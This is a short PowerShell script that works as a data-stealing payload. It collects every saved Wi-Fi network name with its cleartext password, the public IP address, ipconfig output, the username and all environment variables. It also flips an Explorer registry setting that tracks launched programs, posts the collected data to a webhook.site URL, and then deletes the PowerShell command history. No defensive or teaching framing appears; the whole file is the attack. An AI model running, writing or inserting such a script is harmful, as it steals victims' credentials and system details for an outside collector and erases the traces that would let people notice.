$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
  $_.Matches.Value
}
$result = ""
if (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced") {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
    $result = "opposite of fucked up"
} else {
    $result = "fucked up: not found"
}
$wifis = @()

foreach ($profile in $profiles) {
  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
    $_.Matches.Value.Trim()
  }
  $wifis += @{
    'name' = $profile
    'password' = $password
  }
}
$IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$IPconfig = (ipconfig /all)
$envVars = @{}
gci env:* | ForEach-Object {
  $envVars[$_.Name] = $_.Value
}
$Body = @{
  'username' = $env:username
  'ipv4' = $IPV4
  'priv' = $result
  'wifi_profiles' = $wifis
  'ipconfig' = $IPconfig
  'env' = $envVars
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item (Get-PSReadlineOption).HistorySavePath
